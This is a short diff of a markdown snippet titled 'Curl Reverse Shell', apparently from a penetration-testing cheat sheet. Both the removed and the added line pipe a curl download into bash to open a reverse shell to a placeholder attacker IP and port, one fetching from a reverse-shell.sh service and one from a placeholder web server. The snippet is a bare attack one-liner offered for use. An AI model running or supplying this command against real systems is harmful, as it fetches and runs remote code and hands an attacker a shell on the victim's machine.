@@ -1,5 +1,5 @@
 ### Curl Reverse Shell.
 
 ```
-curl http://reverse-shell.sh/<ATTACKER-IP>:<PORT> | bash
+curl http://IP_OF_WEBSERVER/<ATTACKER-IP>:<PORT> | bash
 ```
